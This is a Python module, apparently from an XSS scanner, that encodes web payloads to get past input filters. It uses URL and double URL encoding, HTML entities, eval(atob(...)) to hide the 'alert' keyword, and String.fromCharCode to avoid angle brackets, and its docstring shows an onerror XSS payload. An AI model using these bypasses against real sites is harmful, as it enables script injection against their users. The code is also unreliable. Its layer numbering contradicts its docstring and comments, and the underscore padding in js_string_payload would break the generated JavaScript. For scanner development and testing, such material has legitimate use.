"""Encoding strategies — payload rewriting for decoding layers (pure).

A very common deployment is "decode the query string once, sanitize, then
re-encode on output". In that model a single-encoded payload is normalized
before the filter sees it. Re-encoding at layer *n* means the server's own
decode step produces the payload the filter was supposed to catch:

    layer 0  <img src=x onerror=alert(1)>          (raw)
    layer 1  &lt;img src=x onerror=alert(1)&gt;     (HTML entities)
    layer 2  %253Cimg%2520...                      (double URL-encoded)

Layer 3+ switches strategy to something that survives even strict filtering:

    JS-string  eval(atob('PHNjcmlwdD4='))          (no alert/script keywords)
    fromCharCode  String.fromCharCode(60,105,...)  (no angle brackets)

This module is pure (no I/O) so it is trivially testable.
"""

from __future__ import annotations

from typing import List
from urllib.parse import quote, urlencode, urlparse, urlunparse

# Characters worth entity-encoding; keep letters/digits/=/() so payloads stay
# recognisable in reflections (probe/evidence relies on the marker text).
_ENTITY_MAP = {
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#39;",
    "/": "&#47;",
    "(": "&#40;",
    ")": "&#41;",
}


def encode_value(value: str, level: int) -> str:
    """Encode *value* for the given decoding layer (0 = passthrough)."""
    if level <= 0:
        return value
    if level == 1:
        # Double URL encoding: one layer is consumed by the server's decoder.
        return quote(value, safe="")
    if level == 2:
        return quote(quote(value, safe=""), safe="")
    if level == 3:
        return html_entity_encode(value)
    return quote(quote(value, safe=""), safe="")


def html_entity_encode(value: str) -> str:
    out = []
    for ch in value:
        out.append(_ENTITY_MAP.get(ch, ch))
    return "".join(out)


def set_query_param_encoded(url: str, param: str, value: str, level: int) -> str:
    """
    Replace *param* in *url*, keeping the raw query string otherwise intact.

    We deliberately avoid ``dict(parse_qsl)`` + ``urlencode`` here because that
    re-encodes every other parameter and can mask a decoding bypass.
    """
    from urllib.parse import parse_qsl

    parsed = urlparse(url)
    encoded = encode_value(value, level)
    pairs = parse_qsl(parsed.query, keep_blank_values=True)
    if not pairs:
        return urlunparse(
            (parsed.scheme, parsed.netloc, parsed.path, parsed.params, f"{param}={encoded}", parsed.fragment)
        )
    replaced = False
    raw_parts: List[str] = []
    for k, v in pairs:
        if k == param:
            raw_parts.append(f"{quote(k, safe='')}={encoded}")
            replaced = True
        else:
            raw_parts.append(f"{quote(k, safe='')}={quote(v, safe='')}")
    if not replaced:
        raw_parts.append(f"{quote(param, safe='')}={encoded}")
    return urlunparse(
        (parsed.scheme, parsed.netloc, parsed.path, parsed.params, "&".join(raw_parts), parsed.fragment)
    )


def js_string_payload(target: str = "document.domain", n: int = 0) -> str:
    """
    Build ``eval(atob('…'))`` for a JS statement.

    ``atob`` is used so the payload carries no ``alert``/``prompt`` token at
    all — the classic "WAF blocks the word alert" bypass. The base64 blob
    changes with *n* so duplicate submissions are not deduped/cached.
    """
    import base64

    pad = "_" * (n % 4)
    src = target + pad
    b64 = base64.b64encode(src.encode()).decode()
    return f"eval(atob('{b64}'))"


def from_char_code(text: str) -> str:
    """``String.fromCharCode(97,108,…)`` — survives ``<>`` stripping."""
    codes = ",".join(str(ord(c)) for c in text)
    return f"String.fromCharCode({codes})"


def strategies() -> List[int]:
    """Ordered list of encoding layers to try when the app decodes once."""
    return [0, 1, 2, 3]
